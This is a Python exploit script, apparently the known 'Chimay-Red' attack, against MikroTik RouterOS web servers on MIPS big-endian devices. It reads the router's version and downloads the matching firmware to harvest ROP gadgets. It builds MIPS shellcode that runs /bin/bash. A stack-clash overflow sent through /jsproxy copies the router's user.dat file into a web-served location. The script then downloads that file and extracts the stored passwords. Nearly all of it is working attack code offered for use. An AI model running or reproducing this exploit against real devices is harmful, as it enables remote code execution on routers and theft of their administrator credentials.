#!/usr/bin/env python3

from ropper import RopperService
from tools.extract_user import extract_credential
import requests, re, os
import sys, io, PySquashfsImage
import socket, time, struct

MTDL_URL = "https://download2.mikrotik.com/routeros/"
SQFS_OFFSET = 0x1000
AST_STACKSIZE = 0x800000
ROS_STACKSIZE = 0x20000
SKIP_SPACE = 0x1000
ROP_SPACE = 0x8000
ALIGN_SIZE = 0x10
ADDRESS_SIZE = 0x4

def download_ROS(version, arch, progress=True):
    url = MTDL_URL + version + "/routeros-" + arch + "-" + version + ".npk"
    fw = requests.get(url, headers={"User-Agent": "RouterOS 6.19"}, stream=True)
    fwfd = io.BytesIO()
    if fw.status_code == requests.codes.ok:
        if progress:
            size = int(fw.headers['content-length'])
            for data in fw.iter_content(chunk_size=16*1024):
                fwfd.write(data)
                sys.stdout.write("\r[*] Downloading firmware... %d%%" % (fwfd.tell()*100/size))
                sys.stdout.flush()
            print()
        else:
            print("[*] Downloading firmware...")
            sys.stdout.flush()
            fwfd.write(fw.content)
        return fwfd
    else:
        raise Exception("[!] Error downloading firmware!")

def get_binary(fwfd, path):
    sqfs = PySquashfsImage.SquashFsImage(offset=SQFS_OFFSET)
    sqfs.setFile(fwfd)

    for f in sqfs.root.findAll():
        if f.getPath() == path:
            return f.getContent()

    raise Exception("[!] Path not found!")

def download(version, arch, binary_path, save_name):
    try:
        fw = download_ROS(version, arch)
    except Exception as e:
        print(e)
        return

    print("[*] Extracting", binary_path)
    try:
        binary = get_binary(fw, binary_path)
    except Exception as e:
        print(e)
        return

    with open(save_name, "wb") as f:
        f.write(binary)

    print("[+]", binary_path, "saved as", save_name)

class MyRopper():
    def __init__(self, filename):
        self.rs = RopperService()
        self.rs.clearCache()
        self.rs.addFile(filename)
        self.rs.loadGadgetsFor()
        self.rs.options.inst_count = 10
        self.rs.loadGadgetsFor()
        self.rs.loadGadgetsFor()

    def get_gadgets(self, regex):
        gadgets = []
        for _, g in self.rs.search(search=regex):
            gadgets.append(g)

        if len(gadgets) > 0:
            return gadgets
        else:
            raise Exception("[-] Cannot find gadgets!")

    def contains_string(self, string):
        s = self.rs.searchString(string)
        t = [a for a in s.values()][0]
        return len(t) > 0

    def get_arch(self):
        return self.rs.files[0].arch._name

    @staticmethod
    def get_ra_offset(gadget):
        for line in gadget.lines:
            offset_len = re.findall("lw \$ra, (0x[0-9a-f]+)\(\$sp\)", line[1])
            if offset_len:
                return int(offset_len[0], 16)

        raise Exception("[-] Cannot find $ra offset in this gadget!")

def makeHeader(num):
    return b"POST /jsproxy HTTP/1.1\r\nContent-Length: " + bytes(str(num), 'ascii') + b"\r\n\r\n"

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("[!] Error connecting to socket")
        sys.exit(-1)
    print("[*] Connected")
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("[!] Error sending data")
        sys.exit(-1)
    print("[+] Sent")
    time.sleep(0.5)

def build_shellcode(shellCmd):
    shell_code = b''
    shellCmd = bytes(shellCmd, "ascii")
    shell_code += struct.pack('>L', 0x24500000)
    shell_code += struct.pack('>L', 0x24020fa2)
    shell_code += struct.pack('>L', 0x0000000c)
    shell_code += struct.pack('>L', 0x10400003)
    shell_code += struct.pack('>L', 0x24020001)
    shell_code += struct.pack('>L', 0x24020fa1)
    shell_code += struct.pack('>L', 0x0000000c)
    shell_code += struct.pack('>L', 0x26040050)
    shell_code += struct.pack('>L', 0xae04fff0)
    shell_code += struct.pack('>L', 0x26110060)
    shell_code += struct.pack('>L', 0xae11fff4)
    shell_code += struct.pack('>L', 0x26110070)
    shell_code += struct.pack('>L', 0xae11fff8)
    shell_code += struct.pack('>L', 0xae00fffc)
    shell_code += struct.pack('>L', 0x2205fff0)
    shell_code += struct.pack('>L', 0x2206fffc)
    shell_code += struct.pack('>L', 0x24020fab)
    shell_code += struct.pack('>L', 0x0000000c)
    shell_code += b'P' * (0x50 - len(shell_code))
    shell_code += b'/bin/bash\x00'
    shell_code += b'P' * (0x60 - len(shell_code))
    shell_code += b'-c\x00'
    shell_code += b'P' * (0x70 - len(shell_code))
    shell_code += shellCmd + b'\x00'
    return shell_code

def build_payload(binRop, shellCmd):
    print("[+] Building shellcode + ROP chain...")
    ropChain = b''
    shell_code = build_shellcode(shellCmd)
    stack_finder = binRop.get_gadgets("addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;")[0]
    ropChain += struct.pack('>L', stack_finder.address)
    ropChain += b'B' * 0x18
    ropChain += shell_code
    next_gadget_offset = MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)
    if next_gadget_offset < 0:
        raise Exception("[!] Shell command too long! Max len: " + str(next_gadget_offset + len(shellCmd)) + " bytes")

    ropChain += b'C' * next_gadget_offset
    mov_v0_a0 = binRop.get_gadgets("lw ?ra, %move ?v0, ?a0;% jr ?ra;")[0]
    ropChain += struct.pack('>L', mov_v0_a0.address) 
    ropChain += b'D' * MyRopper.get_ra_offset(mov_v0_a0)
    jump_v0 = binRop.get_gadgets("move ?t9, ?v0; jalr ?t9;")[0]
    ropChain += struct.pack('>L', jump_v0.address)
    return ropChain

def stackClash(ip, port, payload):
    print("[+] Opening 2 sockets")
    s1 = makeSocket(ip, port)
    s2 = makeSocket(ip, port)
    print("[*] Stack clash...")
    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE))
    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE))
    socketSend(s2, makeHeader(ROP_SPACE))
    print("[*] Sending payload")
    socketSend(s1, payload)
    print("[*] Starting exploit")
    s2.close()
    print("[!] Done!")

def crash(ip, port):
    print("[!] Crash...")
    s = makeSocket(ip, port)
    socketSend(s, makeHeader(-1))
    socketSend(s, b'A' * 0x1000)
    s.close()
    time.sleep(2.5)

def chimeyred_mipsbe(target):
    try:
        socket.inet_aton(target)
    except:
        print('[!] Invalid address')
        return False

    try:
        gethtml = requests.get('http://' + target, 'html').text
        patern = re.compile('<h1>RouterOS v(.+?)</h1>')
        form = re.findall(patern, gethtml)
        version = form[0]
        print('[+] Version : ' + version)
        binpath = 'binary/mipsbe_' + version
        if os.path.isfile(binpath) == False:
            download(version, 'mipsbe', '/nova/bin/www', binpath)

        binRop = MyRopper(binpath)
        if binRop.get_arch() != 'MIPSBE':
            raise Exception("[-] Wrong architecture! You have to pass a mipsbe executable")

        if binRop.contains_string("pthread_attr_setstacksize"):
            AST_STACKSIZE = ROS_STACKSIZE

        payload = build_payload(binRop, 'cp /rw/store/user.dat /ram/winbox.idx')
        crash(target, 80)
        stackClash(target, 80, payload)
        time.sleep(5)
        print("[+] Downloading user.dat...")
        if os.path.isfile('index') == True:
            os.remove('index')

        r = requests.get('http://' + target + '/winbox/index', allow_redirects=True)
        open('index', 'wb').write(r.content)
        print("[+] Extract user password...")
        extract_credential('index')
        print("[+] Exploit done...")
    except:
        print('\r[!] Target not exploitable...')
